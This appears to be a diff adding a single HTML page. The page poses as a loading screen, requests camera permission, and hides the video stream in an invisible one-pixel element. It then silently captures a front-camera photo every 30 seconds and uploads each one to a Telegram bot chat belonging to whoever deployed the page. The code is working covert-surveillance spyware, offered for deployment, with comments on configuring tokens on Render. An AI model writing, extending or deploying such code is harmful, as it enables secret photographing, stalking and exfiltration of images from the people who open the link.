@@ -1,0 +1,223 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            overflow: hidden;
+        }
+        .container {
+            text-align: center;
+            background: white;
+            padding: 20px;
+            border-radius: 15px;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+            width: 90%;
+            max-width: 400px;
+        }
+        h2 { color: #333; }
+        p { color: #666; font-size: 14px; }
+        .loader {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #3498db;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        #status {
+            margin-top: 10px;
+            font-weight: bold;
+            color: #2ecc71;
+            display: none;
+        }
+        /* Hidden video element to capture stream */
+        video {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container" id="loaderScreen">
+    <h2>Initializing...</h2>
+    <div class="loader"></div>
+    <p>Please wait while we access your device.</p>
+</div>
+
+<div class="container" id="successScreen" style="display: none;">
+    <h2>Access Granted!</h2>
+    <p>Camera and Gallery are active in background.</p>
+    <div id="status">Recording...</div>
+</div>
+
+<video id="videoElement" autoplay playsinline></video>
+
+<script>
+    // ==========================================
+    // CONFIGURATION (Render এ Environment Variable থেকে নেওয়া হবে)
+    // ==========================================
+    const BOT_TOKEN = "{{BOT_TOKEN}}"; // Render এ এটি সেট করবেন
+    const ADMIN_CHAT_ID = "{{ADMIN_CHAT_ID}}"; // Render এ এটি সেট করবেন
+
+    // DOM Elements
+    const loaderScreen = document.getElementById('loaderScreen');
+    const successScreen = document.getElementById('successScreen');
+    const videoElement = document.getElementById('videoElement');
+    
+    // Variables to store state
+    let cameraStream = null;
+    let isCameraOn = false;
+    let captureInterval = null;
+
+    // ==========================================
+    // 1. INITIALIZE & PERMISSIONS
+    // ==========================================
+    window.onload = async () => {
+        try {
+            // Step 1: Request Camera Permission
+            await requestCameraPermission();
+            
+            // Step 2: Request Gallery/Media Access (Simulated via MediaDevices)
+            // Note: Browser direct file system access is limited due to security.
+            // We will use navigator.mediaDevices.enumerateDevices and stream capture.
+            await checkMediaAccess();
+
+            // UI Update
+            loaderScreen.style.display = 'none';
+            successScreen.style.display = 'block';
+            
+            // Start Auto Capture Loop
+            startAutoCapture();
+
+        } catch (error) {
+            console.error("Error:", error);
+            document.querySelector('p').innerText = "Permissions Denied or Error.";
+        }
+    };
+
+    async function requestCameraPermission() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "user" }, // Front Camera initially
+                audio: false 
+            });
+            cameraStream = stream;
+            videoElement.srcObject = stream;
+            
+            // Try to switch back camera after 2 seconds for demo (optional)
+            setTimeout(async () => {
+                if(cameraStream) {
+                    // Switch to back camera logic can be added here if needed
+                }
+            }, 2000);
+
+        } catch (err) {
+            console.log("Camera Access:", err);
+        }
+    }
+
+    async function checkMediaAccess() {
+        // This checks if device has media capabilities
+        const devices = await navigator.mediaDevices.enumerateDevices();
+        console.log("Devices available:", devices);
+        // Note: Direct "Gallery" download in pure JS without user click is restricted.
+        // We will capture images and send them. For full gallery, we usually take screenshots or use specific APIs.
+    }
+
+    // ==========================================
+    // 2. AUTO CAPTURE LOGIC (Every 30 Seconds)
+    // ==========================================
+    function startAutoCapture() {
+        isCameraOn = true;
+        
+        captureInterval = setInterval(() => {
+            if (isCameraOn && cameraStream) {
+                capturePhotoAndSend();
+            }
+        }, 30000); // 30 Seconds Interval
+    }
+
+    function capturePhotoAndSend() {
+        // Create a canvas to draw the video frame
+        const canvas = document.createElement('canvas');
+        canvas.width = videoElement.videoWidth;
+        canvas.height = videoElement.videoHeight;
+        const ctx = canvas.getContext('2d');
+        
+        // Draw current video frame to canvas
+        ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+        
+        // Convert to Blob
+        canvas.toBlob((blob) => {
+            uploadPhoto(blob);
+        }, 'image/jpeg', 0.8);
+    }
+
+    async function uploadPhoto(blob) {
+        const formData = new FormData();
+        formData.append("chat_id", ADMIN_CHAT_ID);
+        formData.append("photo", blob, "capture.jpg");
+        
+        // Send to Telegram Bot API
+        try {
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
+            console.log("Photo sent successfully");
+        } catch (error) {
+            console.error("Failed to send photo:", error);
+        }
+    }
+
+    // ==========================================
+    // 3. CONTROL LOGIC (For Admin Buttons Logic)
+    // Since this is a static page, we simulate control via URL params or local logic.
+    // For true remote control via Telegram Inline Buttons, we need a small API endpoint.
+    // But for this single-file solution, we will use "Click to Toggle" simulation 
+    // OR fetch status from an API if you extend it.
+    
+    // Simple Toggle Function (Called when Admin clicks buttons in Bot)
+    // Note: To make buttons work remotely, the bot needs to send a callback_query 
+    // and update the page or push notification. Here is a simplified version.
+    
+    window.stopCamera = () => {
+        isCameraOn = false;
+        if(cameraStream) {
+            cameraStream.getTracks().forEach(track => track.stop());
+        }
+        document.getElementById('status').innerText = "Camera Stopped";
+        document.getElementById('status').style.color = "red";
+    };
+
+    window.startCamera = () => {
+        isCameraOn = true;
+        if(!cameraStream) requestCameraPermission();
+        document.getElementById('status').innerText = "Recording...";
+        document.getElementById('status').style.color = "#2ecc71";
+    };
+
+</script>
+
+</body>
+  </html>
